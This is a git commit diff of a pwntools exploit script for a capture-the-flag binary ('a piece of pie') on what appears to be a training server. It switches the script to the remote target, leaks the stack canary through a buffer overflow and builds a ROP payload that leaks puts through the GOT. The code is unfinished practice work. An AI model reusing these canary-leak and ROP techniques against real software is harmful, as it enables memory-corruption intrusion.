942376bd02f65933a8bedb164fff317f8f079cd5
Brian <hibrian827@gmail.com>
2024-04-05 04:18:33 +0900

    sending to linux

--- WHS/main.py
+++ WHS/main.py
@@ -1,11 +1,11 @@
 from pwn import *
 
-# port =  23371
-# rem = remote("srv1.kitriwhs.kr", port)
+port =  21807
+rem = remote("srv1.kitriwhs.kr", port)
 
 
-rem = process(["./a piece of pie"])
-rem.interactive()
+# rem = process(["./a piece of pie"])
+# rem.interactive()
 
 puts_offset = 0x80e50
 puts_plt = 0x10b0
@@ -14,21 +14,22 @@ puts_got = 0x3fa0
 # elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
 # base_to_gadget = elf.symbols["gadget"]
 
+gadget = 0x126e
+
 # libc = ELF('./WHS/a piece of pie/problem/libc.so.6')
 
 payload = b"A" * 0x1
 rem.sendafter(b"name: ", payload)
-print(rem.recvline())
-
 
 payload = b"A" * 0xa9
 rem.sendafter(b"1: ", payload)
-print(rem.recvline())
+rem.recvuntil(payload)
+recv = rem.recvline().rstrip()
+canary = p64(int(recv[0:7].hex(), 16))
+print(canary)
 
-canary = b""
-gadget = b""
-payload = b"A"
-rem.sendlineafter(b"2: ", payload)
+payload = b"A" * 0xa8 + canary + b"B" * 0x8 + p64(gadget) +p64(puts_got) + p64(puts_plt)
+rem.sendafter(b"2: ", payload)
 print(rem.recvline())
 # print(rem.recvline().hex()[-14 : -2])
 # rem.sendlineafter(b"3: ", payload)
--- WHS/temp.py
+++ WHS/temp.py
@@ -2,10 +2,4 @@ from pwn import *
 
 print("B"*0x100)
 
-elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
-base_to_gadget = elf.symbols["gadget"]
-print(base_to_gadget)
-
-libc = ELF('./WHS/a piece of pie/problem/libc.so.6')
-print(libc.got("_IO_puts"))
-print(libc.got("_IO_puts").plt)
+print(hex(0x5555555553db + 125))
